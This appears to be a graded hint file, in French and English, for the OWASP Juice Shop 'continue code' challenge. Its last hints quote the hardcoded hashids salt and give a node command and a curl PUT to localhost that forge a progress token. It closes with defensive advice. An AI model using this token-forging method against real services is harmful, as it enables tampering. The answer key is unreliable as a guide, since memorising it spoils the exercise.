challenge_key: "continueCodeChallenge"
schema_version: "juicelab.hints.v2"

hints:
  N1:
    cost_pct: 5
    text_fr: |
      Hint OWASP officiel #1 : "You need to trick
      the hacking progress persistence feature".
      Donc le challenge cible le restore-progress
      mecanisme. Hint #2 : "Find out how saving
      and restoring progress is done behind the
      scenes". Ou ta progression est-elle
      conservee entre deux sessions (cookies,
      requetes au chargement du score-board) ?
    text_en: |
      Official OWASP hint #1: "You need to trick
      the hacking progress persistence feature".
      So challenge targets restore-progress
      mechanism. Hint #2: "Find out how saving
      and restoring progress is done behind the
      scenes". Where is your progress kept
      between sessions (cookies, requests made
      when the score board loads)?
    pedagogical_intent: |
      Activate the persistence-mechanism reflex by observation,
      without naming the endpoint.

  N2:
    cost_pct: 10
    text_fr: |
      Hint OWASP #3 : "Deduce from all available
      information (e.g. the package.json.bak)".
      Donc pre-requis : forgottenDevBackup pour
      acceder package.json.bak. Cherche dans les
      dependencies une library d'encoding/hashing
      : tu trouveras `hashids`. C'est la library
      utilisee.
    text_en: |
      OWASP hint #3: "Deduce from all available
      information (e.g. package.json.bak)". So
      prerequisite: forgottenDevBackup to access
      package.json.bak. Look in dependencies for
      encoding/hashing library: you'll find
      `hashids`. That's the library used.
    pedagogical_intent: |
      Spell library identification.

  N3:
    cost_pct: 20
    text_fr: |
      Hints OWASP #4 + #5 : "additional secret
      during its encryption" + "really stupid
      mistake a developer might make when
      choosing such a secret". Cherche dans le
      bundle Angular OU dans le source Juice
      Shop pour `new Hashids(...)`. Tu trouveras
      le SALT. La "really stupid mistake" =
      utiliser une string predictible/literale
      comme salt.
    text_en: |
      OWASP hints #4 + #5: "additional secret
      during its encryption" + "really stupid
      mistake a developer might make when
      choosing such a secret". Look in Angular
      bundle OR Juice Shop source for `new
      Hashids(...)`. You'll find SALT. "Really
      stupid mistake" = using predictable/
      literal string as salt.
    pedagogical_intent: |
      Spell salt discovery method.

  N4:
    cost_pct: 35
    text_fr: |
      Code serveur (routes/restoreProgress.ts, lignes 12 a 25) :
        const hashidsAlphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        const hashids = new Hashids('this is my salt', 60, hashidsAlphabet)
        const ids = hashids.decode(continueCode)
        if (... && ids.includes(999)) solve(continueCodeChallenge)
      Le sel est une phrase litterale, en clair dans le code.
      L'endpoint est PUT /rest/continue-code/apply/:continueCode
      (server.ts) : un GET ne passe pas par ce handler. Il te reste a
      encoder [999] avec les memes parametres.
    text_en: |
      Server code (routes/restoreProgress.ts, lines 12 to 25):
        const hashidsAlphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        const hashids = new Hashids('this is my salt', 60, hashidsAlphabet)
        const ids = hashids.decode(continueCode)
        if (... && ids.includes(999)) solve(continueCodeChallenge)
      The salt is a literal phrase, in clear text in the code.
      The endpoint is PUT /rest/continue-code/apply/:continueCode
      (server.ts): a GET does not reach this handler. All that is
      left is to encode [999] with the same parameters.
    pedagogical_intent: |
      Give the exact parameters (salt, length, alphabet on one line)
      and the HTTP verb.

  N5:
    cost_pct: 50
    text_fr: |
      Solution (verifiee en recette sur Juice Shop 19.2.1) :
        npm install hashids
        node -e "const H=require('hashids/cjs');console.log(new H('this is my salt',60,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890').encode(999))"
        # -> 69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
        curl -s -X PUT http://127.0.0.1:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
      Reponse 200, challenge resolu. Le meme code envoye en GET
      renvoie une erreur 500 sans resoudre.
      Defense : hashids est un encodage reversible, pas une
      protection ; un sel public ou devinable le rend trivial. Pour
      un jeton de progression, signer le contenu cote serveur (HMAC
      avec un secret aleatoire hors du code) ou garder l'etat en base
      et ne remettre au client qu'un identifiant opaque.
    text_en: |
      Solution (verified during testing on Juice Shop 19.2.1):
        npm install hashids
        node -e "const H=require('hashids/cjs');console.log(new H('this is my salt',60,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890').encode(999))"
        # -> 69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
        curl -s -X PUT http://127.0.0.1:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj
      Response 200, challenge solved. The same code sent with GET
      returns a 500 error without solving.
      Defense: hashids is a reversible encoding, not a protection; a
      public or guessable salt makes it trivial. For a progress
      token, sign the content server-side (HMAC with a random secret
      kept out of the code) or keep the state in the database and
      give the client only an opaque identifier.
    pedagogical_intent: |
      Full solution: verified encode and PUT, GET pitfall, defense.
